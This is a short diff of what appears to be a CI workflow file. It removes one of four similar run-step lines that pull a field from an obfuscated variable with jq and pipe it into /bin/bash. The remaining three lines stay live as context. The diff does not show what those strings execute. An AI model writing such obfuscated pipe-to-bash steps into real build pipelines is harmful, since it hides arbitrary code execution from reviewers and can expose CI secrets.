@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$thvdv3" | jq -r .akyyi67 | /bin/bash
           echo $gq812 | jq -r .wlx1990 | /bin/bash
           echo $iuqc6 | jq -r .yhi7058 | /bin/bash
-          printf '%s' "$ctg133" | jq -r .xa9229 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
